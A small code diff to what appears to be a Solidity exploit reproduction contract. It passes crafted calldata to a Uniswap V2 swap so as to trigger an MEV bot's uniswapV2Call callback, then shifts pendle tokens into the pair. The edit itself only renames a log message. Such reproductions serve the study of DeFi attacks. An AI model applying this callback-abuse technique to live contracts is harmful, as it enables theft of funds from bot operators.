@@ -160,10 +160,11 @@ contract mev_bot{
         bytes memory _data = "0x000000000000000000000000000000000000000000000079cab7ea8f2bb01430";
         UniswapV2Pair(pendle_ot_slp).swap(0, 200, mev_bot_addr, _data);             ////how to use mev bot's uniswapv2call
         console.log("4xxxxxx mev bot swap done...");
+        
 
 
         (uint256 r000, uint256 r111, ) = UniswapV2Pair(pendle_slp).getReserves();
-        console.log("2xxxxxx after swap pendle slp reserve0 and reserve1 remain: ", r000, r111);
+        console.log("5xxxxxx after swap pendle slp reserve0 and reserve1 remain: ", r000, r111);
 
         IERC20(pendle).transfer(pendle_slp, 9143221416380545295906765);
 
